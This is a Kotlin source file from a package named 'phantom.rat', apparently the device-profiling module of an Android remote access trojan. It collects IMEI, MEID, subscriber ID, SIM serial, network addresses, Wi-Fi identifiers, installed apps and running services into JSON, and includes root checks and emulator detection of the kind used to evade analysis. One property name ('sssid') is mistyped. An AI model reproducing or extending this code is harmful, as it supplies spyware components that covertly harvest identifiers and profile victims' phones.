package com.phantom.rat.utils

import android.app.ActivityManager
import android.bluetooth.BluetoothAdapter
import android.content.Context
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.hardware.Sensor
import android.hardware.SensorManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiInfo
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.os.storage.StorageManager
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.DisplayMetrics
import android.view.WindowManager
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.io.FileReader
import java.net.NetworkInterface
import java.util.*

class DeviceUtils(private val context: Context) {

    fun getFullDeviceInfo(): JSONObject {
        return JSONObject().apply {
            put("system", getSystemInfo())
            put("hardware", getHardwareInfo())
            put("network", getNetworkInfo())
            put("storage", getStorageInfo())
            put("sensors", getSensorInfo())
            put("installed_apps", getInstalledApps())
            put("running_services", getRunningServices())
            put("battery", getBatteryInfo())
            put("display", getDisplayInfo())
            put("security", getSecurityInfo())
        }
    }

    private fun getSystemInfo(): JSONObject {
        return JSONObject().apply {
            put("android_version", Build.VERSION.RELEASE)
            put("sdk_version", Build.VERSION.SDK_INT)
            put("build_id", Build.ID)
            put("build_display", Build.DISPLAY)
            put("build_fingerprint", Build.FINGERPRINT)
            put("build_type", Build.TYPE)
            put("build_tags", Build.TAGS)
            put("build_host", Build.HOST)
            put("build_user", Build.USER)
            put("build_time", Build.TIME)
            put("bootloader", Build.BOOTLOADER)
            put("radio_version", Build.RADIO ?: "unknown")
            put("cpu_abi", Build.CPU_ABI)
            put("cpu_abi2", Build.CPU_ABI2)
            put("supported_abis", Build.SUPPORTED_ABIS.joinToString(", "))
            put("supported_32bit_abis", Build.SUPPORTED_32_BIT_ABIS.joinToString(", "))
            put("supported_64bit_abis", Build.SUPPORTED_64_BIT_ABIS.joinToString(", "))
            put("java_vm", System.getProperty("java.vm.version") ?: "")
            put("os_name", System.getProperty("os.name") ?: "")
            put("user_agent", System.getProperty("http.agent") ?: "")
        }
    }

    private fun getHardwareInfo(): JSONObject {
        return JSONObject().apply {
            put("manufacturer", Build.MANUFACTURER)
            put("brand", Build.BRAND)
            put("model", Build.MODEL)
            put("device", Build.DEVICE)
            put("product", Build.PRODUCT)
            put("board", Build.BOARD)
            put("hardware", Build.HARDWARE)
            put("serial", Build.SERIAL)
            put("android_id", Settings.Secure.getString(
                context.contentResolver, Settings.Secure.ANDROID_ID))
            
            // RAM
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            activityManager.getMemoryInfo(memInfo)
            put("ram_total", memInfo.totalMem)
            put("ram_available", memInfo.availMem)
            put("ram_threshold", memInfo.threshold)
            put("ram_low", memInfo.lowMemory)
            
            // CPU
            try {
                val reader = BufferedReader(FileReader("/proc/cpuinfo"))
                val cpuInfo = reader.readText()
                reader.close()
                put("cpu_info", cpuInfo)
            } catch (_: Exception) {}
            
            try {
                val reader = BufferedReader(FileReader("/proc/meminfo"))
                val memInfoStr = reader.readText()
                reader.close()
                put("mem_info", memInfoStr)
            } catch (_: Exception) {}
        }
    }

    private fun getNetworkInfo(): JSONObject {
        return JSONObject().apply {
            try {
                val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                val network = connectivityManager.activeNetwork
                val capabilities = connectivityManager.getNetworkCapabilities(network)
                
                put("is_connected", network != null)
                
                capabilities?.let {
                    put("has_wifi", it.hasTransport(NetworkCapabilities.TRANSPORT_WIFI))
                    put("has_cellular", it.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR))
                    put("has_ethernet", it.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET))
                    put("has_vpn", it.hasTransport(NetworkCapabilities.TRANSPORT_VPN))
                    put("speed", it.linkDownstreamBandwidthKbps)
                    put("upstream_speed", it.linkUpstreamBandwidthKbps)
                    put("is_metered", !it.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_METERED))
                    put("is_validated", it.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED))
                }
                
                // WiFi info
                try {
                    val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
                    val wifiInfo = wifiManager.connectionInfo
                    put("wifi_ssid", wifiInfo.sssid?.replace("\"", "") ?: "")
                    put("wifi_bssid", wifiInfo.bssid ?: "")
                    put("wifi_rssi", wifiInfo.rssi)
                    put("wifi_speed", wifiInfo.linkSpeed)
                    put("wifi_frequency", wifiInfo.frequency)
                } catch (_: Exception) {}
                
                // IP addresses
                val ips = JSONArray()
                NetworkInterface.getNetworkInterfaces()?.let { interfaces ->
                    while (interfaces.hasMoreElements()) {
                        val intf = interfaces.nextElement()
                        val intfIps = JSONArray()
                        val addresses = intf.inetAddresses
                        while (addresses.hasMoreElements()) {
                            val addr = addresses.nextElement()
                            if (!addr.isLoopbackAddress) {
                                intfIps.put(addr.hostAddress ?: "")
                            }
                        }
                        if (intfIps.length() > 0) {
                            ips.put(JSONObject().apply {
                                put("name", intf.name)
                                put("display_name", intf.displayName)
                                put("mtu", intf.mtu)
                                put("is_up", intf.isUp)
                                put("is_loopback", intf.isLoopback)
                                put("is_virtual", intf.isVirtual)
                                put("is_point_to_point", intf.isPointToPoint)
                                put("hardware_address", 
                                    intf.hardwareAddress?.joinToString(":") { 
                                        String.format("%02X", it) 
                                    } ?: "")
                                put("ip_addresses", intfIps)
                            })
                        }
                    }
                }
                put("network_interfaces", ips)
                
                // Telephony info
                try {
                    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                    put("phone_type", telephonyManager.phoneType)
                    put("network_type", telephonyManager.dataNetworkType)
                    put("network_operator", telephonyManager.networkOperatorName ?: "")
                    put("network_country_iso", telephonyManager.networkCountryIso ?: "")
                    put("sim_country_iso", telephonyManager.simCountryIso ?: "")
                    put("sim_operator", telephonyManager.simOperatorName ?: "")
                    put("sim_serial", telephonyManager.simSerialNumber ?: "")
                    put("subscriber_id", telephonyManager.subscriberId ?: "")
                    put("voice_mail_number", telephonyManager.voiceMailNumber ?: "")
                    put("is_roaming", telephonyManager.isNetworkRoaming)
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        put("imei", telephonyManager.imei ?: "")
                        put("meid", telephonyManager.meid ?: "")
                    }
                } catch (_: Exception) {}
                
            } catch (e: Exception) {
                put("error", e.message)
            }
        }
    }

    private fun getStorageInfo(): JSONObject {
        return JSONObject().apply {
            try {
                val storages = JSONArray()
                val storageManager = context.getSystemService(Context.STORAGE_SERVICE) as StorageManager
                
                // Internal storage
                val internal = Environment.getExternalStorageDirectory()
                val internalStat = StatFs(internal.absolutePath)
                storages.put(JSONObject().apply {
                    put("type", "internal")
                    put("path", internal.absolutePath)
                    put("total", internalStat.totalBytes)
                    put("free", internalStat.freeBytes)
                    put("used", internalStat.totalBytes - internalStat.freeBytes)
                    put("total_formatted", formatBytes(internalStat.totalBytes))
                    put("free_formatted", formatBytes(internalStat.freeBytes))
                })
                
                // External volumes
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    val volumes = storageManager.storageVolumes
                    volumes.forEach { volume ->
                        val dir = volume.directory
                        if (dir != null && dir.absolutePath != internal.absolutePath) {
                            try {
                                val stat = StatFs(dir.absolutePath)
                                storages.put(JSONObject().apply {
                                    put("type", "external")
                                    put("path", dir.absolutePath)
                                    put("total", stat.totalBytes)
                                    put("free", stat.freeBytes)
                                    put("used", stat.totalBytes - stat.freeBytes)
                                    put("total_formatted", formatBytes(stat.totalBytes))
                                    put("free_formatted", formatBytes(stat.freeBytes))
                                    put("is_removable", volume.isRemovable)
                                    put("is_primary", volume.isPrimary)
                                    put("description", volume.description)
                                    put("state", volume.state)
                                })
                            } catch (_: Exception) {}
                        }
                    }
                }
                
                put("storages", storages)
                
            } catch (e: Exception) {
                put("error", e.message)
            }
        }
    }

    private fun getSensorInfo(): JSONObject {
        return JSONObject().apply {
            try {
                val sensorManager = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
                val sensors = sensorManager.getSensorList(Sensor.TYPE_ALL)
                val sensorArray = JSONArray()
                
                sensors.forEach { sensor ->
                    sensorArray.put(JSONObject().apply {
                        put("name", sensor.name)
                        put("vendor", sensor.vendor)
                        put("type", sensor.type)
                        put("type_string", getSensorTypeString(sensor.type))
                        put("version", sensor.version)
                        put("power", sensor.power)
                        put("resolution", sensor.resolution)
                        put("range", sensor.maximumRange)
                        put("min_delay", sensor.minDelay)
                        put("max_delay", if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
                            sensor.maxDelay else 0)
                    })
                }
                
                put("sensors", sensorArray)
                put("sensor_count", sensorArray.length())
                
            } catch (e: Exception) {
                put("error", e.message)
            }
        }
    }

    private fun getInstalledApps(): JSONObject {
        return JSONObject().apply {
            try {
                val pm = context.packageManager
                val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                val appArray = JSONArray()
                
                apps.forEach { app ->
                    try {
                        val appName = pm.getApplicationLabel(app).toString()
                        val packageName = app.packageName
                        val versionInfo = pm.getPackageInfo(packageName, 0)
                        
                        appArray.put(JSONObject().apply {
                            put("name", appName)
                            put("package", packageName)
                            put("version_name", versionInfo.versionName ?: "")
                            put("version_code", versionInfo.versionCode)
                            put("is_system", (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
                            put("is_updated_system", (app.flags and android.content.pm.ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0)
                            put("is_game", (app.flags and android.content.pm.ApplicationInfo.FLAG_IS_GAME) != 0)
                            put("is_debuggable", (app.flags and android.content.pm.ApplicationInfo.FLAG_DEBUGGABLE) != 0)
                            put("is_installed", (app.flags and android.content.pm.ApplicationInfo.FLAG_INSTALLED) != 0)
                            put("is_hidden", (app.enabledSetting == PackageManager.COMPONENT_ENABLED_STATE_DISABLED))
                            put("first_install_time", versionInfo.firstInstallTime)
                            put("last_update_time", versionInfo.lastUpdateTime)
                            put("target_sdk", app.targetSdkVersion)
                            put("min_sdk", app.minSdkVersion)
                            put("uid", app.uid)
                            put("data_dir", app.dataDir)
                            put("source_dir", app.sourceDir)
                            put("native_lib_dir", app.nativeLibraryDir)
                        })
                    } catch (_: Exception) {}
                }
                
                put("apps", appArray)
                put("count", appArray.length())
                
            } catch (e: Exception) {
                put("error", e.message)
            }
        }
    }

    private fun getRunningServices(): JSONObject {
        return JSONObject().apply {
            try {
                val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                val services = activityManager.getRunningServices(Integer.MAX_VALUE)
                val serviceArray = JSONArray()
                
                services.forEach { service ->
                    serviceArray.put(JSONObject().apply {
                        put("name", service.service.className)
                        put("package", service.service.packageName)
                        put("pid", service.pid)
                        put("uid", service.uid)
                        put("foreground", service.foreground)
                        put("started", service.started)
                        put("restarting", service.restarting)
                        put("process", service.process)
                        put("client_count", service.clientCount)
                        put("client_label", service.clientLabel)
                        put("last_activity_time", service.lastActivityTime)
                        put("active_since", service.activeSince)
                        put("flags", service.flags)
                        put("description", service.description?.toString() ?: "")
                        put("crash_count", service.crashCount)
                    })
                }
                
                put("services", serviceArray)
                put("count", serviceArray.length())
                
                // Running tasks
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                    @Suppress("DEPRECATION")
                    val tasks = activityManager.getRunningTasks(50)
                    val taskArray = JSONArray()
                    tasks.forEach { task ->
                        taskArray.put(JSONObject().apply {
                            put("id", task.id)
                            put("base_activity", task.baseActivity?.flattenToString() ?: "")
                            put("top_activity", task.topActivity?.flattenToString() ?: "")
                            put("num_activities", task.numActivities)
                            put("num_running", task.numRunning)
                            put("description", task.description?.toString() ?: "")
                        })
                    }
                    put("tasks", taskArray)
                }
                
            } catch (e: Exception) {
                put("error", e.message)
            }
        }
    }

    private fun getBatteryInfo(): JSONObject {
        return JSONObject().apply {
            try {
                val intent = context.registerReceiver(null, 
                    android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                
                if (intent != null) {
                    val level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
                    val scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
                    val temperature = intent.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, -1)
                    val voltage = intent.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, -1)
                    val status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)
                    val health = intent.getIntExtra(android.os.BatteryManager.EXTRA_HEALTH, -1)
                    val plugged = intent.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1)
                    val technology = intent.getStringExtra(android.os.BatteryManager.EXTRA_TECHNOLOGY) ?: ""
                    
                    put("level", level)
                    put("scale", scale)
                    put("percentage", if (scale > 0) (level * 100) / scale else -1)
                    put("temperature_celsius", temperature / 10.0)
                    put("voltage", voltage)
                    put("status", when (status) {
                        android.os.BatteryManager.BATTERY_STATUS_CHARGING -> "charging"
                        android.os.BatteryManager.BATTERY_STATUS_DISCHARGING -> "discharging"
                        android.os.BatteryManager.BATTERY_STATUS_FULL -> "full"
                        android.os.BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "not_charging"
                        android.os.BatteryManager.BATTERY_STATUS_UNKNOWN -> "unknown"
                        else -> "unknown"
                    })
                    put("health", when (health) {
                        android.os.BatteryManager.BATTERY_HEALTH_GOOD -> "good"
                        android.os.BatteryManager.BATTERY_HEALTH_OVERHEAT -> "overheat"
                        android.os.BatteryManager.BATTERY_HEALTH_DEAD -> "dead"
                        android.os.BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "over_voltage"
                        android.os.BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE -> "failure"
                        else -> "unknown"
                    })
                    put("plugged", when (plugged) {
                        android.os.BatteryManager.BATTERY_PLUGGED_AC -> "ac"
                        android.os.BatteryManager.BATTERY_PLUGGED_USB -> "usb"
                        android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS -> "wireless"
                        else -> "none"
                    })
                    put("technology", technology)
                }
                
            } catch (e: Exception) {
                put("error", e.message)
            }
        }
    }

    private fun getDisplayInfo(): JSONObject {
        return JSONObject().apply {
            try {
                val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
                val display = windowManager.defaultDisplay
                val metrics = DisplayMetrics()
                display.getMetrics(metrics)
                
                put("width_px", metrics.widthPixels)
                put("height_px", metrics.heightPixels)
                put("density", metrics.density)
                put("density_dpi", metrics.densityDpi)
                put("scaled_density", metrics.scaledDensity)
                put("xdpi", metrics.xdpi)
                put("ydpi", metrics.ydpi)
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val realMetrics = DisplayMetrics()
                    display.getRealMetrics(realMetrics)
                    put("real_width", realMetrics.widthPixels)
                    put("real_height", realMetrics.heightPixels)
                    put("refresh_rate", display.refreshRate)
                    put("hdr_capable", display.isHdr)
                }
                
                put("rotation", display.rotation)
                put("name", display.name)
                put("display_id", display.displayId)
                
            } catch (e: Exception) {
                put("error", e.message)
            }
        }
    }

    private fun getSecurityInfo(): JSONObject {
        return JSONObject().apply {
            put("is_rooted", isDeviceRooted())
            put("is_encrypted", if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                Environment.isExternalStorageEmulated() else false)
            put("is_secure", if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val km = context.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
                km.isDeviceSecure
            } else false)
            put("is_emulator", isEmulator())
            put("is_developer_options_enabled", 
                Settings.Global.getInt(context.contentResolver, 
                    Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) == 1)
            put("adb_enabled",
                Settings.Global.getInt(context.contentResolver,
                    Settings.Global.ADB_ENABLED, 0) == 1)
            put("unknown_sources",
                Settings.Global.getInt(context.contentResolver,
                    Settings.Global.INSTALL_NON_MARKET_APPS, 0) == 1)
        }
    }

    private fun isDeviceRooted(): Boolean {
        val paths = arrayOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su"
        )
        
        if (paths.any { File(it).exists() }) return true
        
        return try {
            Runtime.getRuntime().exec("su -c id").apply { waitFor() }.exitValue() == 0
        } catch (_: Exception) {
            false
        }
    }

    private fun isEmulator(): Boolean {
        return (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")) ||
                Build.FINGERPRINT.startsWith("generic") ||
                Build.FINGERPRINT.startsWith("unknown") ||
                Build.HARDWARE.contains("goldfish") ||
                Build.HARDWARE.contains("ranchu") ||
                Build.MODEL.contains("google_sdk") ||
                Build.MODEL.contains("Emulator") ||
                Build.MODEL.contains("Android SDK built for x86") ||
                Build.MANUFACTURER.contains("Genymotion") ||
                Build.PRODUCT.contains("sdk") ||
                Build.PRODUCT.contains("vbox86p") ||
                Build.PRODUCT.contains("emulator") ||
                Build.PRODUCT.contains("simulator")
    }

    private fun getSensorTypeString(type: Int): String {
        return when (type) {
            Sensor.TYPE_ACCELEROMETER -> "accelerometer"
            Sensor.TYPE_GYROSCOPE -> "gyroscope" 
            Sensor.TYPE_LIGHT -> "light"
            Sensor.TYPE_MAGNETIC_FIELD -> "magnetic_field"
            Sensor.TYPE_PROXIMITY -> "proximity"
            Sensor.TYPE_PRESSURE -> "pressure"
            Sensor.TYPE_TEMPERATURE -> "temperature"
            Sensor.TYPE_AMBIENT_TEMPERATURE -> "ambient_temperature"
            Sensor.TYPE_RELATIVE_HUMIDITY -> "humidity"
            Sensor.TYPE_STEP_COUNTER -> "step_counter"
            Sensor.TYPE_STEP_DETECTOR -> "step_detector"
            Sensor.TYPE_HEART_RATE -> "heart_rate"
            Sensor.TYPE_HEART_BEAT -> "heart_beat"
            Sensor.TYPE_GRAVITY -> "gravity"
            Sensor.TYPE_LINEAR_ACCELERATION -> "linear_acceleration"
            Sensor.TYPE_ROTATION_VECTOR -> "rotation_vector"
            Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR -> "geomagnetic_rotation_vector"
            Sensor.TYPE_GAME_ROTATION_VECTOR -> "game_rotation_vector"
            Sensor.TYPE_SIGNIFICANT_MOTION -> "significant_motion"
            Sensor.TYPE_ORIENTATION -> "orientation"
            else -> "unknown_$type"
        }
    }

    private fun formatBytes(bytes: Long): String = when {
        bytes < 1024 -> "$bytes B"
        bytes < 1024 * 1024 -> String.format(Locale.US, "%.1f KB", bytes / 1024.0)
        bytes < 1024L * 1024 * 1024 -> String.format(Locale.US, "%.1f MB", bytes / (1024.0 * 1024))
        else -> String.format(Locale.US, "%.1f GB", bytes / (1024.0 * 1024 * 1024))
    }
}
